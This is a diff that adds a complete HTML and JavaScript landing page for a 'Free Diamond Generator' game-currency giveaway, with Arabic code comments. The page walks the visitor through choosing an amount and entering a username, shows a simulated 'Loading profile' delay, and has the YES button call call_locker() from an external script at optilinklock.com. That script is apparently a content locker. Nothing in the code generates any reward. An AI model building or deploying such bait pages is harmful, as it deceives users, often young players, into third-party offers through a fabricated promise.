@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Free Diamond Generator | Gaming Reward</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        :root {
+            --primary-bg: linear-gradient(135deg, #0c1a32 0%, #0a1222 100%);
+            --card-bg: rgba(20, 40, 80, 0.7);
+            --primary-green: #00ff88;
+            --secondary-blue: #1a2b4d;
+            --secondary-gray: #2a3a5a;
+            --text-white: #ffffff;
+            --text-gray: #a0b3d6;
+            --accent-blue: #4da6ff;
+            --accent-glow: rgba(0, 255, 136, 0.3);
+            --shadow-dark: rgba(0, 0, 0, 0.5);
+            --shadow-light: rgba(255, 255, 255, 0.05);
+        }
+
+        body {
+            background: var(--primary-bg);
+            color: var(--text-white);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            position: relative;
+        }
+
+        /* Header Image - فقط للمرحلة 1 - أصبحت صورة مربعة */
+        .header-image {
+            width: 140px;
+            height: 140px;
+            border-radius: 50%;
+            overflow: hidden;
+            margin: 0 auto 25px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6);
+            border: 3px solid rgba(77, 166, 255, 0.5);
+            display: none;
+            position: relative;
+        }
+
+        .header-image.active {
+            display: block;
+        }
+
+        .header-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* Main Title - فقط للمرحلة 1 */
+        .main-title {
+            font-size: 32px;
+            text-align: center;
+            margin-bottom: 5px;
+            font-weight: 900;
+            letter-spacing: 1.5px;
+            background: linear-gradient(to right, #4da6ff, #0066ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 15px rgba(77, 166, 255, 0.5);
+            display: none;
+        }
+
+        .main-title.active {
+            display: block;
+        }
+
+        /* Subtitle - فقط للمرحلة 1 */
+        .main-subtitle {
+            color: var(--text-white);
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 16px;
+            opacity: 0.9;
+            display: none;
+        }
+
+        .main-subtitle.active {
+            display: block;
+        }
+
+        /* Step Indicator */
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70%;
+            height: 2px;
+            background: var(--secondary-gray);
+            z-index: 1;
+        }
+
+        .step {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: var(--secondary-gray);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 15px;
+            font-weight: bold;
+            font-size: 18px;
+            position: relative;
+            z-index: 2;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .step.active {
+            background: var(--accent-blue);
+            color: white;
+            box-shadow: 0 0 15px rgba(77, 166, 255, 0.7);
+            border-color: #ffffff;
+        }
+
+        /* Step Container */
+        .step-container {
+            position: relative;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .step-content {
+            width: 100%;
+            transition: transform 0.5s ease, opacity 0.5s ease;
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0;
+            transform: translateX(100%);
+            padding: 10px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .step-content.active {
+            position: relative;
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .step-content.previous {
+            transform: translateX(-100%);
+        }
+
+        /* Common Styles */
+        .title {
+            font-size: 28px;
+            text-align: center;
+            margin-bottom: 10px;
+            font-weight: 700;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+            letter-spacing: 1px;
+        }
+
+        .subtitle {
+            color: var(--text-gray);
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 15px;
+            padding: 20px;
+            width: 100%;
+            box-shadow: 0 10px 20px var(--shadow-dark),
+                        inset 0 1px 0 var(--shadow-light);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+
+        /* Step 1 Styles - MODIFIED */
+        .reward-options {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .reward-card {
+            width: 100%;
+            height: 100px; /* تم زيادة الارتفاع من 86px إلى 100px */
+            border-radius: 14px;
+            background: linear-gradient(to bottom, #173a5e, #0f2742);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.35);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .reward-card:hover {
+            box-shadow: 0 8px 20px rgba(77, 166, 255, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .reward-card.selected {
+            border-color: var(--accent-blue);
+            box-shadow: 0 8px 20px rgba(77, 166, 255, 0.4),
+                        0 0 0 1px rgba(77, 166, 255, 0.2);
+        }
+
+        .diamond-image {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .diamond-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: drop-shadow(0 0 15px rgba(77, 166, 255, 0.5));
+            transition: transform 0.3s ease;
+        }
+
+        .reward-card:hover .diamond-image img {
+            transform: scale(1.05);
+        }
+
+        /* Step 2 Styles */
+        .input-container {
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .step-title {
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 10px;
+            font-weight: 700;
+            color: var(--text-white);
+            letter-spacing: 1px;
+        }
+
+        .step-subtitle {
+            color: var(--text-gray);
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 18px 20px;
+            background: rgba(10, 20, 40, 0.8);
+            border: 2px solid var(--secondary-gray);
+            border-radius: 12px;
+            color: var(--text-white);
+            font-size: 16px;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 15px rgba(77, 166, 255, 0.5);
+        }
+
+        .input-field::placeholder {
+            color: var(--text-gray);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-primary {
+            background: var(--accent-blue);
+            color: white;
+            box-shadow: 0 5px 15px rgba(77, 166, 255, 0.3);
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background: #3399ff;
+            box-shadow: 0 8px 20px rgba(77, 166, 255, 0.5);
+            transform: translateY(-3px);
+        }
+
+        .btn-primary:disabled {
+            background: #2a4a7a;
+            color: #7a8fb3;
+            cursor: not-allowed;
+            opacity: 0.6;
+            box-shadow: none;
+        }
+
+        /* Step 3 Styles */
+        .profile-card {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 30px 20px;
+            margin-bottom: 30px;
+        }
+
+        .profile-image {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background-color: #2a4a8a;
+            margin-bottom: 20px;
+            border: 3px solid var(--accent-blue);
+            box-shadow: 0 0 20px rgba(77, 166, 255, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .profile-image i {
+            font-size: 40px;
+            color: #a0c8ff;
+        }
+
+        .username {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: var(--accent-blue);
+        }
+
+        .verification-question {
+            font-size: 20px;
+            text-align: center;
+            margin-bottom: 25px;
+            color: var(--text-white);
+        }
+
+        .button-group {
+            display: flex;
+            width: 100%;
+            gap: 15px;
+        }
+
+        .btn-secondary {
+            background: var(--secondary-gray);
+            color: var(--text-white);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .btn-secondary:hover {
+            background: #3a4a6a;
+            transform: translateY(-3px);
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(5, 10, 20, 0.95);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .spinner {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            border: 5px solid transparent;
+            border-top: 5px solid var(--accent-blue);
+            border-right: 5px solid var(--accent-blue);
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        .loading-text {
+            font-size: 20px;
+            color: var(--text-gray);
+            letter-spacing: 1px;
+        }
+
+        /* Animations */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(77, 166, 255, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(77, 166, 255, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(77, 166, 255, 0); }
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .main-title {
+                font-size: 28px;
+            }
+            
+            .title {
+                font-size: 24px;
+            }
+            
+            .step {
+                width: 35px;
+                height: 35px;
+                margin: 0 10px;
+                font-size: 16px;
+            }
+            
+            .card {
+                padding: 15px;
+            }
+            
+            .header-image {
+                width: 120px;
+                height: 120px;
+            }
+            
+            .reward-card {
+                height: 90px; /* تكبير قليل للجوال أيضاً */
+            }
+        }
+    </style>
+
+<script type="text/javascript" src="https://optilinklock.com/script_include.php?id=1860077"></script>     
+
+</head>
+<body>
+    <div class="container">
+        <!-- Header Image - فقط للمرحلة 1 -->
+        <div class="header-image active" id="headerImage">
+            <img src="https://i.postimg.cc/jSXrWSm0/NIGH.webp" alt="Diamond Reward">
+        </div>
+
+        <!-- Main Title & Subtitle - فقط للمرحلة 1 -->
+        <h1 class="main-title active" id="mainTitle">FREE DIAMOND</h1>
+        <p class="main-subtitle active" id="mainSubtitle">choose the desired diamond amount</p>
+
+        <!-- Step Indicator -->
+        <div class="step-indicator">
+            <div class="step active" data-step="1">1</div>
+            <div class="step" data-step="2">2</div>
+            <div class="step" data-step="3">3</div>
+        </div>
+
+        <!-- Step Container -->
+        <div class="step-container">
+            <!-- STEP 1: Reward Selection -->
+            <div class="step-content active" id="step1">
+                <!-- تمت إزالة الـ .card الخارجي تماماً -->
+                <div class="reward-options">
+                    <div class="reward-card" data-value="50">
+                        <div class="diamond-image">
+                            <img src="https://i.postimg.cc/Gp3f8JnC/gemini-2-5-flash-image-Remove-the-blue-frame-around-the-image-and-resize-the-gem-and-the-number-so-t.jpg" alt="Diamond Option">
+                        </div>
+                    </div>
+                    
+                    <div class="reward-card" data-value="100">
+                        <div class="diamond-image">
+                            <img src="https://i.postimg.cc/wTMxYJG8/gemini_2_5_flash_image_Create_another_version_of_this_image_each_one_with_a_different_number_100_0.jpg" alt="Diamond Option">
+                        </div>
+                    </div>
+                    
+                    <div class="reward-card" data-value="200">
+                        <div class="diamond-image">
+                            <img src="https://i.postimg.cc/SNRQb8vp/gemini_2_5_flash_image_Create_another_version_of_this_image_each_one_with_a_different_number_250_0.jpg" alt="Diamond Option">
+                        </div>
+                    </div>
+                    
+                    <div class="reward-card" data-value="500">
+                        <div class="diamond-image">
+                            <img src="https://i.postimg.cc/TY12vm4v/gemini_2_5_flash_image_Create_another_version_of_this_image_each_one_with_a_different_number_700_0.jpg" alt="Diamond Option">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 2: Username Input -->
+            <div class="step-content" id="step2">
+                <div class="card">
+                    <h2 class="step-title">ENTER USERNAME</h2>
+                    <p class="step-subtitle">enter your information to continue</p>
+                    
+                    <div class="input-container">
+                        <input type="text" class="input-field" placeholder="Enter your username" id="usernameInput">
+                        <button class="btn btn-primary" id="nextBtn" disabled>NEXT</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 3: Account Verification -->
+            <div class="step-content" id="step3">
+                <div class="card">
+                    <h2 class="step-title">ACCOUNT VERIFICATION</h2>
+                    <p class="step-subtitle">confirm your account details</p>
+                    
+                    <div class="profile-card">
+                        <div class="profile-image">
+                            <img src="[[PROFILE_IMAGE_PLACEHOLDER]]" alt="Profile Image" style="display:none;">
+                            <i class="fas fa-user"></i>
+                        </div>
+                        <div class="username" id="displayUsername">@exemple</div>
+                    </div>
+                    
+                    <h2 class="verification-question">Is this your account?</h2>
+                    
+                    <div class="button-group">
+                       <button class="btn btn-primary" onclick="call_locker();">YES</button>
+                        <button class="btn btn-secondary" id="noBtn">NO</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Loading Overlay -->
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="spinner"></div>
+            <p class="loading-text">Loading profile...</p>
+        </div>
+    </div>
+
+    <script>
+        // DOM Elements
+        const stepContents = document.querySelectorAll('.step-content');
+        const steps = document.querySelectorAll('.step');
+        const rewardCards = document.querySelectorAll('.reward-card');
+        const nextBtn = document.getElementById('nextBtn');
+        const yesBtn = document.getElementById('yesBtn');
+        const noBtn = document.getElementById('noBtn');
+        const usernameInput = document.getElementById('usernameInput');
+        const displayUsername = document.getElementById('displayUsername');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const headerImage = document.getElementById('headerImage');
+        const mainTitle = document.getElementById('mainTitle');
+        const mainSubtitle = document.getElementById('mainSubtitle');
+        
+        let currentStep = 1;
+        let selectedReward = null;
+        let username = "";
+        
+        // Step Navigation Functions
+        function goToStep(step) {
+            // Update step indicator
+            steps.forEach(s => {
+                s.classList.remove('active');
+                if (parseInt(s.dataset.step) === step) {
+                    s.classList.add('active');
+                }
+            });
+            
+            // Update step content
+            stepContents.forEach(content => {
+                content.classList.remove('active', 'previous');
+                
+                const contentStep = content.id.replace('step', '');
+                if (parseInt(contentStep) === step) {
+                    content.classList.add('active');
+                } else if (parseInt(contentStep) < step) {
+                    content.classList.add('previous');
+                }
+            });
+            
+            // Show/hide header image and titles based on step
+            if (step === 1) {
+                headerImage.classList.add('active');
+                mainTitle.classList.add('active');
+                mainSubtitle.classList.add('active');
+            } else {
+                headerImage.classList.remove('active');
+                mainTitle.classList.remove('active');
+                mainSubtitle.classList.remove('active');
+            }
+            
+            currentStep = step;
+        }
+        
+        // Step 1: Reward Selection
+        rewardCards.forEach(card => {
+            card.addEventListener('click', function() {
+                // Remove selected class from all cards
+                rewardCards.forEach(c => c.classList.remove('selected'));
+                
+                // Add selected class to clicked card
+                this.classList.add('selected');
+                selectedReward = this.dataset.value;
+                
+                // Add a visual feedback animation
+                this.style.animation = 'pulse 0.5s';
+                setTimeout(() => {
+                    this.style.animation = '';
+                }, 500);
+                
+                // Automatically proceed to step 2 after a short delay
+                setTimeout(() => {
+                    goToStep(2);
+                }, 300);
+            });
+        });
+        
+        // Step 2: Username Input - تحقق من المدخلات
+        usernameInput.addEventListener('input', function() {
+            const usernameValue = this.value.trim();
+            
+            // تفعيل أو تعطيل زر NEXT بناءً على وجود نص
+            if (usernameValue.length > 0) {
+                nextBtn.disabled = false;
+                nextBtn.style.cursor = 'pointer';
+            } else {
+                nextBtn.disabled = true;
+                nextBtn.style.cursor = 'not-allowed';
+            }
+        });
+        
+        nextBtn.addEventListener('click', function() {
+            // إذا كان الزر معطلاً، لا تفعل شيئاً
+            if (this.disabled) return;
+            
+            username = usernameInput.value.trim();
+            
+            // إذا لم يدخل المستخدم اسم مستخدم، استخدم الافتراضي
+            if (!username) {
+                username = "exemple";
+            }
+            
+            // تحديث عرض اسم المستخدم للمرحلة 3
+            displayUsername.textContent = `@${username}`;
+            
+            // إظهار شاشة التحميل
+            loadingOverlay.classList.add('active');
+            
+            // محاكاة تأخير التحميل، ثم الانتقال إلى المرحلة 3
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                goToStep(3);
+            }, 2000);
+        });
+        
+        // السماح بمفتاح Enter لتشغيل زر NEXT
+        usernameInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !nextBtn.disabled) {
+                nextBtn.click();
+            }
+        });
+        
+     
+        noBtn.addEventListener('click', function() {
+            // تأثير مرئي للزر
+            this.style.animation = 'pulse 0.5s';
+            setTimeout(() => {
+                this.style.animation = '';
+            }, 500);
+            
+            // العودة إلى المرحلة 2
+            goToStep(2);
+        });
+        
+        // تهيئة الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            // تعيين اسم المستخدم الافتراضي للعرض
+            displayUsername.textContent = "@exemple";
+            
+            // إعداد زر NEXT ليكون معطلاً في البداية
+            nextBtn.disabled = true;
+            nextBtn.style.cursor = 'not-allowed';
+            
+            // إضافة بعض التأثيرات المرئية للعناصر
+            const cards = document.querySelectorAll('.card');
+            cards.forEach(card => {
+                card.addEventListener('mouseenter', function() {
+                    this.style.transform = 'translateY(-5px)';
+                });
+                
+                card.addEventListener('mouseleave', function() {
+                    this.style.transform = 'translateY(0)';
+                });
+            });
+        });
+    </script>
+</body>
+</html>
